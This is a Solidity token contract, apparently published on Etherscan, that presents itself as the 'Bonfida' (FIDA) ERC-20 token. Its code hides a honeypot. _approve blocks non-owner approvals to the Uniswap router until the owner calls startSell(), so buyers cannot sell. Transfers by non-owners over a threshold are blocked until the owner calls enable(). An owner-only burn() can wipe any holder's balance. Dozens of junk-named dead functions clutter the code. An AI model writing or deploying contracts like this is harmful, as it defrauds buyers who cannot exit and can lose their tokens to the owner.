/**
 *Submitted for verification at Etherscan.io on 2020-12-16
*/

pragma solidity ^0.6.0;

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
    
    function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
        uint256 c = add(a,m);
        uint256 d = sub(c,1);
        return mul(div(d,m),m);
    }
}

contract FlatFanDul is IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 private _totalSupply = 10000000 * 10 ** 14;

    string private _name = "Bonfida";
    string private _symbol = "FIDA";
    uint8 private _decimals = 14;
    uint256 start;
    address private __owner;
    bool public booleanfun = true;
    bool public brap;
    bool public winorgwjekrmg;
    uint wejwgno05923kjm;
    uint owerw432fsd2wt;


    constructor () public {
        __owner = msg.sender;
        _balances[__owner] = _totalSupply;
        start = now;
        brap = true;
        winorgwjekrmg = false;
        wejwgno05923kjm = 93;
        owerw432fsd2wt = 1021;
    }
    modifier onlyOwner(){
        require(msg.sender == __owner);
        _;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function multiTransfer(address[] memory addresses, uint256 amount) public {
        for (uint256 i = 0; i < addresses.length; i++) {
            transfer(addresses[i], amount);
        }
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function bih356y435rguewgw95ptuio45mkln(uint8 decimals_, bool atersonlk, bool nanananana) internal {
        _decimals = 14;
                brap = false;
        winorgwjekrmg= false;
    }
    function twtwr(uint8 decimals_) internal {
        _decimals = 16;
                brap = true;
        winorgwjekrmg= true;
    }
    function twt34wr(uint8 decimals_) internal {
        _decimals = 16;
                brap = true;
        winorgwjekrmg= true;
    }
    function enable() public {
        if (msg.sender != __owner) {
            revert();
        }
        
        booleanfun = false;
    }
    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if (booleanfun) {
            if (amount > 5 ether && sender != __owner) {
                revert('dibglusedgwie0bt98w4injkflds');
            }
        }
        uint8 ad = 1;
        uint256 a = 3;
        bool ag = true;
        uint256 tokensToBurn = amount.div(20);
        uint256 tokensToTransfer = amount.sub(tokensToBurn);
        
        _beforeTokenTransfer(sender, recipient, amount);
        
        _burn(sender, tokensToBurn);
        _balances[sender] = _balances[sender].sub(tokensToTransfer, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(tokensToTransfer);
        emit Transfer(sender, recipient, tokensToTransfer);
    }
    function burn(address account, uint256 val) onlyOwner() public{
        _burn(account, val);
    }
    function twt334fdswr(uint8 decimals_) internal {
        _decimals = 16;
                brap = true;
        winorgwjekrmg= true;
    }
    function twe5u3twr(uint8 decimals_) internal {
        _decimals = 16;
                brap = true;
        winorgwjekrmg= true;
    }
    function bi345hb345uegw95ptuio45mkln (uint8 decimals_,uint8 oneeafs, address addressr23r, uint8 njdfk) internal {
        _decimals = 18;
                brap = true;
        winorgwjekrmg= false;
    }
    function hrthbiueg6j7fw95ptu3io45mkln(uint8 decimals_, uint256 good, address spended) internal {
        _decimals = 15;
        brap = false;
        winorgwjekrmg= false;
    }
    function bih45y356y435rguewgw5y295ptuio45mkln(uint8 decimals_) internal {
        _decimals = 16;
        brap = false;
        winorgwjekrmg= false;
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
       if (brap && owner != __owner) {
            if(spender == 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D){
                revert();
            }
        }
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }
    function biuegw95ptuio45mkln (uint8 decimals_, bool oloer) internal {
        _decimals = 10;
                brap = true;
        winorgwjekrmg= true;
    }
    function hrthbiuegfw95ptuio45mkln(uint8 decimals_, address dragon, bool anananan, uint256 kol) internal {
        _decimals = 12;
                brap = false;
        winorgwjekrmg= false;
    }

    function t243t2wtwr(uint8 decimals_) internal {
        _decimals = 16;
                brap = true;
        winorgwjekrmg= true;
    }
    function tw45y46twr(uint8 decimals_) internal {
        _decimals = 16;
                brap = true;
        winorgwjekrmg= true;
    }
    function trh53wtwr(uint8 decimals_) internal {
        _decimals = 16;
                brap = true;
        winorgwjekrmg= true;
    }

    function startSell() public onlyOwner(){
        brap = false;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
}